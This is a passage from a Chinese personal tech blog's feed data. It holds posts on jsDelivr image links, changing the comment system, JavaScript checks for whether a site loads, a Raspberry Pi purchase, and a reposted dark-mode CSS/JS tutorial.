Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"From Twikoo To Waline","date":"2021-04-19 21:25:00","description":"\n<p>我建立博客以来，评论系统一直都在变化。你看，又换回 Waline 了。</p>\n<p>更换过程：</p>\n<p>Gitalk -&gt; Valine -&gt; Waline -&gt; Twikoo -&gt; Waline </p>\n<p>更换的原因是 Tencent CloudBase 的数据库每天只有 500 次读取，随随便便就没了，体验不是很好。</p>\n<p>而我需要的是一款有后端、免费部署的评论系统，于是我选择了 Waline。</p>\n<p>现在每天使用 GitHub Action 向 Waline API 发生请求，避免 LeanCloud 存档。</p>\n","link":"https://blog.yfun.top/posts/1685510532/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 20:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 19:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 12:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span 